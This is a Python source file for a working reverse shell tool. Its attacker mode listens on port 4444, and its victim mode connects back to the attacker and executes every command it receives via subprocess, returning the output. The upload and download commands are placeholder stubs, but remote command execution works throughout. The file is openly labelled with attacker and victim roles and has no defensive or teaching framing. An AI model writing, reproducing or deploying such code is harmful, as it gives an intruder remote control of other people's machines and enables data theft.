import socket
import argparse
import os
import tqdm
import psutil
import subprocess


# [_GLOBAL DATA_] #


# ANSI COLOR CODES (used to display coloured outputs in the terminal)
# ================
class tcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#-----------------x---------------------#



def Attacker_fun():
    try:
        HOST = args.Ip_Addr 
        PORT = args.Port
        BUFFER_SIZE = 1024 * args.Buffer_Size
        SEPERATOR = "<sep>"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((HOST, PORT))
        sock.listen(args.Conn_num)
        print(tcolors.HEADER + f"Listening as {HOST}:{PORT}..." + tcolors.ENDC)
        victim_sock, victim_addr = sock.accept()
        print(tcolors.OKBLUE + f"{victim_addr[0]}:{victim_addr[1]} Connected!!" + tcolors.ENDC)

        cwd = victim_sock.recv(BUFFER_SIZE).decode()
        #print(f"[+] Current Working Directory: {cwd}")
        while True:
            cmd = input(f"{cwd} $>")
            if not cmd.strip():
                continue
            victim_sock.send(cmd.encode())
            if cmd.lower() == "exit":
                break
            elif cmd.lower() == "show":
                print("[+] Command 'uload' -> to upload a file")
                print("[+] Command 'dload' -> to download a file")
                continue
            # elif cmd.lower() == "uload":
            #     print(uload_fun(cmd))
            #     continue
            # elif cmd.lower() == "dload":
            #     print(dload_fun())
            #     continue
            output = victim_sock.recv(BUFFER_SIZE).decode()
            result, cwd = output.split(SEPERATOR)
            print(result)
    except ConnectionError:
        print(tcolors.FAIL + "[!] Something went wrong!!" + tcolors.ENDC)

    




def Victim_fun():
    try:
        HOST = args.Ip_Addr
        PORT = args.Port
        BUFFER_SIZE = 1024 * args.Buffer_Size
        SEPERATOR = "<sep>"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        
        cwd = os.getcwd()
        sock.send(cwd.encode())
        while True:
            cmd = sock.recv(BUFFER_SIZE).decode()
            splitted_cmd = cmd.split()
            if splitted_cmd[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splitted_cmd[1:]))
                except FileNotFoundError as err:
                    output = str(err)
                else:
                    output = ""
            elif splitted_cmd[0].lower() == "uload":
                try:
                    s_path = ''
                    if len(splitted_cmd) < 2:
                        output = f"{tcolors.WARNING}[!] Warning: please specify the path.. {tcolors.ENDC}"
                    elif len(splitted_cmd) == 3:
                        s_path = splitted_cmd[2]
                    elif len(splitted_cmd) > 3:
                        raise IndexError
                    print(uload_fun(splitted_cmd[1], s_path))
                except FileNotFoundError as err:
                    output = str(err)
                except IndexError as err_in:
                    output = str(err_in)
                else:
                    output = ""
            elif splitted_cmd[0].lower() == "dload":
                try:
                    s_path = ''
                    if len(splitted_cmd) == 1:
                        output = f"{tcolors.WARNING}[!] Warning: please specify the path.. {tcolors.ENDC}"
                    elif len(splitted_cmd) == 3:
                        s_path = splitted_cmd[2]
                    elif len(splitted_cmd) > 3:
                        raise IndexError
                    print(dload_fun(splitted_cmd[1], s_path))
                except FileNotFoundError as err:
                    output = str(err)
                except IndexError as err_in:
                    output = str(err_in)
                else:
                    output =""
            else:
                output = subprocess.getoutput(cmd)

            cwd = os.getcwd()
            message = f"{output}{SEPERATOR}{cwd}"
            sock.send(message.encode())
        sock.close()
    except ConnectionRefusedError:
        print(tcolors.FAIL + "[!] Connection Refused!!" + tcolors.ENDC)
    except ConnectionAbortedError:
        print(tcolors.WARNING + "[!] Connection is closed!!" + tcolors.ENDC)
    except ConnectionError:
        print(tcolors.FAIL + "[!] Something went wrong!!" + tcolors.ENDC)


def uload_fun(filepath, s_filepath):
    return f"{filepath} {s_filepath}"

def dload_fun(filepath, s_filepath):
    return f"{filepath} {s_filepath}"



# [_MAIN_] #

parser = argparse.ArgumentParser()
group_machine = parser.add_mutually_exclusive_group() # a group(group_machine) so that an end-user cannot set both options 'a' and 'v' at the same time
group_machine.add_argument('-a', '--attack', dest='Attacker', action='store_true', help='set to specify attacker machine')
group_machine.add_argument('-v', '--victim', dest='Victim', action='store_true', help='set to specify victim machine')

# Attacker_group = parser.add_argument_group(title='Attacker Options')
# Victim_group = parser.add_argument_group(title='Victim Options')

# Attacker_group.add_argument('-ia', '--addr', dest='Ip_Addr', default="0.0.0.0", help='to set the ip address')
# Victim_group.add_argument('-iv', '--addr', dest='Ip_Addr', required=True, help='to set the ip address')
parser.add_argument('-i', '--addr', dest='Ip_Addr', default='0.0.0.0', help="to set the ip address(required with '-v')")
parser.add_argument('-p', '--port', dest='Port', default=4444, type=int, help='to set the port')
parser.add_argument('-s', '--size', dest='Buffer_Size', default=320, type=int, help='to set size of the buffer')
parser.add_argument('-c', '--conn', dest='Conn_num', default=5, type=int, help='to set max number of connection that can be created')
args = parser.parse_args()


if args.Attacker:
    Attacker_fun()
elif args.Victim:
    if args.Ip_Addr == '0.0.0.0':
        print(tcolors.WARNING + "\n[!] Warning: set the ip address of the attacker machine along with option 'v'\n" + tcolors.ENDC)
        print("[#]" + tcolors.BOLD + " Use '-h' or '--help' to see all the options\n" + tcolors.ENDC)
    else: Victim_fun()
else:
    parser.print_help()


